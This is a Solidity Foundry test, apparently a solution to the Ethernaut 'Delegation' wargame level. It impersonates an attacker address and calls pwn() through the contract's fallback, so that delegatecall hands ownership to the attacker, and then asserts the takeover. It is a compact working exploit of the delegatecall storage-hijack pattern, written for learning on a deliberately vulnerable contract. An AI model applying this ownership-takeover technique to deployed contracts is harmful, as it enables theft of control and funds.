//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {Delegation} from "../src/Delegation.sol";
import {Delegate} from "../src/Delegation.sol";
import {console} from "forge-std/console.sol";

contract DelegationTest is Test {
    Delegation delegation;
    Delegate delegate;
    address public attacker = address(0x123);

    function setUp() public {
        delegate = new Delegate(address(0));
        delegation = new Delegation(address(delegate));
    }

    function testTakeOwnership() public {
        
        // PHASE 1: Check initial owner
        address initaialOwner = delegation.owner();
        console.log("Initial owner: ", initaialOwner);

        //Phase 2: Perfrom the attack by calling the fallback function
        vm.prank(attacker);
        (bool success,) = address(delegation).call(abi.encodeWithSignature("pwn()"));
        require(success, "Attack should succeed");

        // PHASE 3: Check owner after the attack
        address newOwner = delegation.owner();
        console.log("New owner: ", newOwner);

        //Phase 4: Verify ownership has been taken
        assertEq(newOwner, attacker, "Owner should be the attacker");

    }
}
